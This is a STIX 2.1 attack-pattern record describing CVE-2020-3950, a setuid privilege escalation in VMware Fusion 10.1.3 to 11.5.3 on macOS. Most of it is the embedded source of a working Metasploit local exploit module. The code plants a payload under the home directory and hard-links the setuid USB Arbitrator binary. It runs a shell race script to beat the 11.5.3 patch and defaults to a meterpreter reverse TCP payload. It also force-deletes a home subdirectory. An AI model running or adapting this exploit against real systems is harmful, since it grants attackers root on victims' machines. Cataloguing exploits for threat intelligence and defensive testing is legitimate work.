{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f5250a96-00b6-41a2-bf64-84d6a3f031c6",
    "created": "2024-08-14T16:34:55.907564Z",
    "modified": "2024-08-14T16:34:55.907568Z",
    "name": "VMware Fusion USB Arbitrator Setuid Privilege Escalation",
    "description": " This exploits an improper use of setuid binaries within VMware Fusion 10.1.3 - 11.5.3. The Open VMware USB Arbitrator Service can be launched outide of its standard path which allows loading of an attacker controlled binary.  By creating a payload in the user home directory in a specific folder, and creating a hard link to the 'Open VMware USB Arbitrator Service' binary, we're able to launch it temporarily to start our payload with an effective UID of 0. @jeffball55 discovered an incomplete patch in 11.5.3 with a TOCTOU race. Successfully tested against 10.1.6, 11.5.1, 11.5.2, and 11.5.3.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/vmware_fusion_lpe.rb",
            "external_id": "vmware_fusion_lpe.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-3950"
        },
        {
            "source_name": "reference",
            "url": "https://www.vmware.com/security/advisories/VMSA-2020-0005.html"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/jeffball55/status/1242530508053110785?s=20"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/grimm-co/NotQuite0DayFriday/blob/master/2020.03.17-vmware-fusion/notes.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  include Msf::Post::OSX::Priv\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'VMware Fusion USB Arbitrator Setuid Privilege Escalation',\n        'Description' => %q{\n          This exploits an improper use of setuid binaries within VMware Fusion 10.1.3 - 11.5.3.\n          The Open VMware USB Arbitrator Service can be launched outide of its standard path\n          which allows loading of an attacker controlled binary.  By creating a payload in the\n          user home directory in a specific folder, and creating a hard link to the 'Open VMware\n          USB Arbitrator Service' binary, we're able to launch it temporarily to start our payload\n          with an effective UID of 0.\n          @jeffball55 discovered an incomplete patch in 11.5.3 with a TOCTOU race.\n          Successfully tested against 10.1.6, 11.5.1, 11.5.2, and 11.5.3.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Dhanesh Kizhakkinan', # discovery\n          'Rich Mirch', # edb module\n          'jeffball <jeffball@dc949.org>', # 11.5.3 exploit\n          'grimm'\n        ],\n        'Platform' => [ 'osx' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'References' => [\n          [ 'CVE', '2020-3950' ],\n          [ 'EDB', '48235' ],\n          [ 'URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0005.html' ],\n          [ 'URL', 'https://twitter.com/jeffball55/status/1242530508053110785?s=20' ],\n          [ 'URL', 'https://github.com/grimm-co/NotQuite0DayFriday/blob/master/2020.03.17-vmware-fusion/notes.txt' ]\n        ],\n        'DisclosureDate' => '2020-03-17',\n        'DefaultOptions' => {\n          'PAYLOAD' => 'osx/x64/meterpreter_reverse_tcp',\n          'WfsDelay' => 15\n        },\n        'Notes' => {\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options [\n      OptInt.new('MAXATTEMPTS', [true, 'Maximum attempts to win race for 11.5.3', 75])\n    ]\n  end\n\n  def open_usb_service\n    'Open VMware USB Arbitrator Service'\n  end\n\n  def usb_service\n    'VMware USB Arbitrator Service'\n  end\n\n  def get_home_dir\n    home = cmd_exec 'echo ~'\n    if home.blank?\n      fail_with Failure::BadConfig, 'Unable to determine home dir for shell.'\n    end\n    home\n  end\n\n  def content_dir\n    \"#{get_home_dir}/Contents\"\n  end\n\n  def base_dir\n    \"#{content_dir}/Library/services/\"\n  end\n\n  def kill_process(executable)\n    pid_kill = cmd_exec %(ps ax | grep #{executable} | grep -v grep | awk '{print \"kill -9 \" $1}')\n    cmd_exec pid_kill\n  end\n\n  def get_version\n    # Thanks to @ddouhine on github for this answer!\n    version_raw = cmd_exec \"plutil -p '/Applications/VMware Fusion.app/Contents/Info.plist' | grep CFBundleShortVersionString\"\n    /=> \"(?<version>\\d{0,2}\\.\\d{0,2}\\.\\d{0,2})\"/ =~ version_raw # supposed 11.x is also vulnerable, but everyone whos tested shows 11.5.1 or 11.5.2\n    if version_raw.blank?\n      fail_with Failure::BadConfig, 'Unable to determine VMware Fusion version.  Set ForceExploit to override.'\n    end\n    Rex::Version.new(version)\n  end\n\n  def pre_11_5_3\n    # Upload payload executable & chmod\n    payload_filename = \"#{base_dir}#{usb_service}\"\n    print_status \"Uploading Payload: #{payload_filename}\"\n    write_file payload_filename, generate_payload_exe\n    chmod payload_filename, 0o755\n    register_file_for_cleanup payload_filename\n\n    # create folder structure and hard link to the original binary\n    root_link_folder = \"#{get_home_dir}/#{rand_text_alphanumeric(2..5)}\" # for cleanup later\n    link_folder = \"#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/\"\n    cmd_exec \"mkdir -p #{link_folder}\"\n    cmd_exec \"ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'\"\n    print_status \"Created folder (#{link_folder}) and link\"\n\n    print_status 'Starting USB Service (5 sec pause)'\n    # XXX: The ; used by cmd_exec will interfere with &, so pad it with :\n    cmd_exec \"cd #{link_folder}; '#{link_folder}/#{open_usb_service}' & :\"\n    Rex.sleep 5 # give time for the service to execute our payload\n    print_status 'Killing service'\n    cmd_exec \"pkill '#{open_usb_service}'\"\n    print_status \"Deleting #{root_link_folder}\"\n    rm_rf root_link_folder\n  end\n\n  def exactly_11_5_3\n    # Upload payload executable & chmod\n    payload_name = \"#{base_dir}#{rand_text_alphanumeric(5..10)}\"\n    print_status \"Uploading Payload to #{payload_name}\"\n    write_file payload_name, generate_payload_exe\n    chmod payload_name, 0o755\n    # create race with codesign check\n    root_link_folder = \"#{get_home_dir}/#{rand_text_alphanumeric(2..5)}\" # for cleanup later\n    link_folder = \"#{root_link_folder}/#{rand_text_alphanumeric(2..5)}/#{rand_text_alphanumeric(2..5)}/\"\n    print_status 'Uploading race condition executable.'\n    race = <<~EOF\n      #!/bin/sh\n      while [ \"1\" = \"1\" ]; do\n          ln -f '/Applications/VMware Fusion.app/Contents/Library/services/#{usb_service}' '#{base_dir}#{usb_service}'\n          ln -f '#{payload_name}' '#{base_dir}#{usb_service}'\n      done\n    EOF\n    racer_name = \"#{base_dir}#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx racer_name, race\n    register_file_for_cleanup racer_name\n    register_dirs_for_cleanup root_link_folder\n    # create the hard link\n    print_status \"Creating folder (#{link_folder}) and link\"\n    cmd_exec \"mkdir -p #{link_folder}\"\n    cmd_exec \"ln '/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}' '#{link_folder}#{open_usb_service}'\"\n\n    # create the launcher to start the racer and keep launching our service to attempt to win\n    launcher = <<~EOF\n      #!/bin/sh\n      #{racer_name} &\n      for i in {1..#{datastore['MAXATTEMPTS']}}\n      do\n          echo \"attempt $i\";\n          '#{link_folder}#{open_usb_service}'\n      done\n    EOF\n    runner_name = \"#{base_dir}#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx runner_name, launcher\n    register_file_for_cleanup runner_name\n\n    print_status \"Launching Exploit #{runner_name} (sleeping 15sec)\"\n    # XXX: The ; used by cmd_exec will interfere with &, so pad it with :\n    results = cmd_exec \"#{runner_name} & :\"\n    Rex.sleep 15 # give time for the service to execute our payload\n    vprint_status results\n\n    print_status 'Exploit Finished, killing scripts.'\n    kill_process racer_name\n    kill_process runner_name # in theory should be killed already but just in case\n    kill_process \"'#{link_folder}#{open_usb_service}'\"\n    # kill_process 'ln' a rogue ln -f may mess us up, but killing them seemed to be unreliable and mark the exploit as failed.\n    # above caused: [-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_process_execute: Operation failed: Unknown error\n    # rm_rf base_dir # this always fails. Leaving it here as a note that when things dont kill well, can't delete the folder\n  end\n\n  def check\n    unless exists? \"/Applications/VMware Fusion.app/Contents/Library/services/#{open_usb_service}\"\n      print_bad \"'#{open_usb_service}' binary missing\"\n      return CheckCode::Safe\n    end\n    version = get_version\n    if version.between?(Rex::Version.new('10.1.3'), Rex::Version.new('11.5.3'))\n      vprint_good \"Vmware Fusion #{version} is exploitable\"\n    else\n      print_bad \"VMware Fusion #{version} is NOT exploitable\"\n      return CheckCode::Safe\n    end\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    # Make sure we can write our payload to the remote system\n    rm_rf content_dir # live dangerously.\n    if directory? content_dir\n      fail_with Failure::BadConfig, \"#{content_dir} exists. Unable to delete automatically.  Please delete or exploit will fail.\"\n    end\n    cmd_exec \"mkdir -p #{base_dir}\"\n    register_dirs_for_cleanup content_dir\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable.\"\n    end\n\n    version = get_version\n    if version == Rex::Version.new('11.5.3')\n      vprint_status 'Using 11.5.3 exploit'\n      exactly_11_5_3\n    elsif version.between?(Rex::Version.new('10.1.3'), Rex::Version.new('11.5.2'))\n      vprint_status 'Using pre-11.5.3 exploit'\n      pre_11_5_3\n    end\n    rm_rf content_dir # live dangerously.\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-03-17",
    "x_mitre_platforms": [
        "[ 'osx' ]"
    ]
}